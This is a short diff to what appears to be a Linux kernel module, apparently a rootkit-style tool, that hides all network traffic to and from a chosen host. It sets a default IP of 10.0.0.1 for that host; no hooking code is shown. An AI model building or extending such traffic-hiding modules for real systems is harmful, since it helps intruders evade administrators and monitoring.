@@ -10,7 +10,7 @@
 #define JUMP_CODE_ADDR_OFFSET 1
 
 // The IP of the host we want to hide the traffic with
-char* blocked_host;
+char* blocked_host = "10.0.0.1";
 module_param(blocked_host, charp, 0);
 MODULE_PARM_DESC(blocked_host, "IP of the host all packets to and from are hidden");
 unsigned int blocked_host_ip;
